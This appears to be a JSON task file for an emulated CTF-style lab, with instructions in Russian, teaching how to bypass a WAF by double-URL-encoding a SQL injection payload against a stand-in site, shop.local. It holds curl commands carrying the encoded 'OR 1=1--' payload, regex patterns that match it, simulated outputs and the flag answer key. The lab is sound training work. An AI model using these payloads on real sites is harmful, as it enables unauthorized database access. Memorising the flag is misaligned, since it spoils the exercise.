@@ -1,0 +1,43 @@
+{
+  "id": "web-waf-bypass-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{d0ubl3_3nc0d1ng_byp4ss3s_w4f}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: обход WAF двойным кодированием\n\n`shop.local` стоит за WAF, который декодирует URL **один раз** и ищет слова.\n\n1. Убедись, что обычный payload блокируется:\n\n   curl -s 'https://shop.local/search?q=test%27%20OR%201%3D1--' -o /dev/null -w '%{http_code}\\n'\n\n2. WAF декодирует `%25` -> `%`, а приложение затем декодирует `%27` -> `'`.\n   Закодируй payload дважды, чтобы смысл собрался только на втором слое.\n\n3. Отправь двойное кодирование и сохрани ответ:\n\n   curl -s 'https://shop.local/search?q=%2527%2520OR%25201%253D1--' > found.txt\n\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local за WAF)",
+      "cases": [
+        {
+          "match": "%2527|%2520|%253d",
+          "example": "-s 'https://shop.local/search?q=%2527%2520OR%25201%253D1--'",
+          "output": "<!doctype html><title>shop.local — search</title>\n[waf] payload decoded once -> harmless; passed\n[app] decoded twice -> SQL injection executed\n[result] admin:nto{d0ubl3_3nc0d1ng_byp4ss3s_w4f}\n"
+        },
+        {
+          "match": "%27|%20or|%201%3d1|oR%20|or%201",
+          "example": "-s 'https://shop.local/search?q=test%27%20OR%201%3D1--'",
+          "output": "<html><head><title>403 Forbidden</title></head><body>Blocked by WAF</body></html>\n",
+          "code": 0
+        },
+        {
+          "match": "shop\\.local/search",
+          "example": "-s https://shop.local/search?q=test",
+          "output": "<!doctype html><title>shop.local — search</title>\n<p>Результаты по запросу: test</p>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется shop.local за WAF.\n"
+    }
+  }
+}
